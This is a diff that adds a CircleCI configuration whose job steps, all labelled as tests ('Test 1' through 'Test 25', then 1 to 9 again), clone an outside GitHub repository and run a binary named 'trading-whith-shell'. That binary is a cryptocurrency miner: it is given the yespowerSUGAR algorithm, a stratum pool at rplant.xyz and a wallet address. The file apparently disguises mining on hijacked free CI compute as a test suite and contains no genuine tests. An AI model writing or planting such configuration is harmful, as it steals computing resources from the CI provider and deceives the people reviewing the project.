@@ -1,0 +1,149 @@
+version: 2.1
+orbs:
+  python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command:
+            git clone https://github.com/muhamadkon/1 &&
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 1
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 2
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 3
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 4
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 5
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 6
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 7
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 8
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 9
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 10
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 11
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 12
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 13
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 14
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 15
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 16
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 17
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 18
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 19
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 20
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 21
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 22
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 23
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 24
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 25
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 1
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 2
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 3
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 4
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 5
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 6
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 7
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 8
+      - run:
+          command:
+            cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.cicleci2 -t 10 --cpu-priority 4 --time-limit 540s
+          name: Test 9
+workflows:
+  main:
+    jobs:
+      - build-and-test
